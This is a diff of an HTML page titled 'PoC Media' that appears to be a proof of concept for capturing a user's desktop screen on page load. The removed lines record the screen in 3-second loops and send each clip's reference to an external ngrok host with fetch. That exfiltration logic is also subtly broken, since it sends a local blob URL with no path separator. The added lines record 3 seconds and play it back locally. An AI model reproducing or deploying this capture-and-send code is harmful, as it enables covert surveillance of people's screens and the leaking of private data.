@@ -1,75 +1,48 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="utf-8">
-  <title>PoC Media</title>
+	<meta charset="utf-8">
+	<title>PoC Media</title>
 </head>
 <body>
-  <video controls id="output"></video>
+    <video controls id="output"></video>
 
-  <script>
-    // Stream capture
-    const constraints = {
-      video: {
-        mandatory: {
-          chromeMediaSource: 'desktop',
-          minWidth: 1280,
-          maxWidth: 1280,
-          minHeight: 720,
-          maxHeight: 720
-        },
-      },
-    };
+    <script>
+      // stream capture
+      const constraints = {
+        video: {
+             mandatory: {
+                chromeMediaSource: 'desktop',
+                minWidth: 1280,
+                maxWidth: 1280,
+                minHeight: 720,
+		maxHeight: 720
+             },
+         },
+      };
+      // const constraints = {audio: false,  video: true}; // video capture
+      // const constraints = {audio: true,  video: false};  // audio capture
 
-    let mediaRecorder; // Variable to store the MediaRecorder instance
-    let intervalId; // Interval identifier for recording and sending video
-
-    function startRecording() {
       navigator.getUserMedia(constraints, (stream) => {
-        mediaRecorder = new MediaRecorder(stream);
-        let chunks = []; // Array to store video data
-
-        mediaRecorder.ondataavailable = (e) => {
-          chunks.push(e.data);
-        }
+        const mediaRecorder = new MediaRecorder(stream);
 
         mediaRecorder.start();
 
-        // Function to record and send video every 3 seconds
-        function recordAndSendVideo() {
-          setTimeout(() => {
-            mediaRecorder.stop();
-            const blob = new Blob(chunks, { type: 'video/webm' });
-            chunks = []; // Clear the array for the next video data
-            const videoUrl = URL.createObjectURL(blob);
-            sendVideoUrl(videoUrl); // Call function to send video URL as a parameter
-            mediaRecorder.start(); // Start a new recording
-            recordAndSendVideo(); // Recursive call for the next iteration
-          }, 3000);
+        mediaRecorder.ondataavailable = (e) => {
+          const reader = new FileReader();
+
+          reader.readAsDataURL(e.data);
+          reader.onloadend = () => {
+            const base64data = reader.result;
+	    document.getElementById('output').src = base64data.replace('video/x-matroska', 'video/mp4'); // replace mime for chrome's tag video
+            // do anything with stream here            
+          }
         }
 
-        recordAndSendVideo(); // Start the first iteration of recording and sending video
-      }, (err) => {
-        console.log(err);
-      });
-    }
-
-    // Function to send video URL as a parameter in a GET request
-    function sendVideoUrl(videoUrl) {
-      const requestUrl = 'https://ea0b-95-106-68-53.ngrok-free.app' + encodeURIComponent(videoUrl);
-
-      fetch(requestUrl)
-        .then(response => {
-          // Handle the server response
-          console.log('Video URL successfully sent to the server.');
-        })
-        .catch(error => {
-          // Handle errors when sending video URL
-          console.error('Error sending video URL to the server:', error);
-        });
-    }
-
-    startRecording(); // Start recording and sending video when the page loads
-  </script>
+        setTimeout(() => {
+          mediaRecorder.stop();
+        }, 3000); // autostop record
+      }, (err) => {console.log(err) });
+    </script>
 </body>
 </html>
